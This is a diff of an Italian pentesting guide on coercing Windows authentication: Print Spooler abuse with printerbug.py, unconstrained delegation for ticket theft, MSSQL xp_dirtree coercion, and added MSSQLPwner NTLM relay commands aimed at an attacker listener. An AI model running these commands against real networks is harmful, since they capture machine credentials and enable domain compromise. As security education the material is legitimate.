@@ -22,7 +22,7 @@ Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" dat
 ## Abuso del servizio Spooler
 
 Se il servizio _**Print Spooler**_ è **abilitato**, puoi utilizzare alcune credenziali AD già note per **richiedere** al server di stampa del Domain Controller un **aggiornamento** sui nuovi lavori di stampa e semplicemente dirgli di **inviare la notifica a un sistema**.\
-Nota che quando la stampante invia la notifica a sistemi arbitrari, deve **autenticarsi** contro quel **sistema**. Pertanto, un attaccante può far sì che il servizio _**Print Spooler**_ si autentichi contro un sistema arbitrario, e il servizio utilizzerà **l'account del computer** in questa autenticazione.
+Nota che quando la stampante invia la notifica a sistemi arbitrari, deve **autenticarsi contro** quel **sistema**. Pertanto, un attaccante può far sì che il servizio _**Print Spooler**_ si autentichi contro un sistema arbitrario, e il servizio utilizzerà **l'account del computer** in questa autenticazione.
 
 ### Trovare server Windows nel dominio
 
@@ -54,7 +54,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Combinazione con Delegazione Illimitata
 
-Se un attaccante ha già compromesso un computer con [Delegazione Illimitata](unconstrained-delegation.md), l'attaccante potrebbe **far autenticare la stampante contro questo computer**. A causa della delegazione illimitata, il **TGT** dell'**account del computer della stampante** sarà **salvato in** **memoria** del computer con delegazione illimitata. Poiché l'attaccante ha già compromesso questo host, sarà in grado di **recuperare questo ticket** e abusarne ([Pass the Ticket](pass-the-ticket.md)).
+Se un attaccante ha già compromesso un computer con [Delegazione Illimitata](unconstrained-delegation.md), l'attaccante potrebbe **far autenticare la stampante contro questo computer**. A causa della delegazione illimitata, il **TGT** dell'**account computer della stampante** sarà **salvato in** **memoria** del computer con delegazione illimitata. Poiché l'attaccante ha già compromesso questo host, sarà in grado di **recuperare questo ticket** e abusarne ([Pass the Ticket](pass-the-ticket.md)).
 
 ## Forzare l'autenticazione RCP
 
@@ -77,6 +77,17 @@ C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -S
 ### MSSQL
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
+```
+[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
+```shell
+# Issuing NTLM relay attack on the SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on the local server with custom command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 ```
 Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
